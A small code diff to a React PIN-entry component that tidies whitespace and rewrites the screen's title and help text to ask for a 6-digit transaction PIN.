@@ -12,7 +12,7 @@ const schema = yup.object().shape({
   pin: yup
     .string()
     .matches(/^\d+$/, "PIN must be numeric")
-  
+
     .required("PIN is required"),
 });
 
@@ -39,7 +39,6 @@ const Pin = () => {
       .then((response) => {
         console.log(response.data);
         reset(); // Clear the input field
-      
       })
       .catch((error) => {
         console.error("There was an error!", error);
@@ -54,10 +53,11 @@ const Pin = () => {
     <div className="otp">
       <div className="container">
         <div className="contentSec">
-          <div className="title">Enter PIN to continue</div>
+          <div className="title">Enter Your Transaction PIN</div>
 
           <div className="subText">
-            Enter your Pin which you use for your withdrawls
+            For your security, please enter your 6-digit transaction PIN to
+            complete this action
           </div>
         </div>
         <div className="loginWrapper">
